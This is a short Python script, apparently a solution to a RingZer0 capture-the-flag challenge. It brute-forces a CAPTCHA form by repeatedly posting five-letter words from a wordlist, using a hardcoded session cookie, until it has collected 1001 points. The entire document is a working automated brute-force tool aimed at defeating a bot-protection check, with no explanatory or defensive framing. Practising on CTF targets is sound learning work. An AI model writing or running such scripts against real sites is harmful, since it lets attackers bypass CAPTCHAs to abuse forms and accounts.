import requests

BASE_URL = "http://challenges.ringzer0team.com:10139/captcha2.php"
GEN_CAP = "http://challenges.ringzer0team.com:10139/form2.php"
M_COOKIE = "71gtmneo0gvthv0j68j8ak5644"

def send_request(_word):
	tmpR = requests.get(GEN_CAP, cookies = {"PHPSESSID" : M_COOKIE})
	_data = {
		"captcha" : _word
	}
	r = requests.post(BASE_URL, data = _data, cookies = {"PHPSESSID" : M_COOKIE})
	raw = r.text
	if "You have the wrong captcha" in raw:
		return False
	else:
		return True

def engine():
	point = 0
	fail = 0
	print("[+] Initializing point to 0")
	while point < 1001:
		with open('wordlist-en.txt', 'r') as f:
			_line = f.readline()
			while _line:
				if len(_line.strip()) == 5:
					res = send_request(_line.strip())
					if res:
						point += 1
					else:
						fail += 1
					print("[+] Collected points : {} 			Fail count : {}".format(point, fail), end = "\r")
				_line = f.readline()

if "__main__" in __name__:
	print("[+] Naiame brute forcer starting...")
	engine()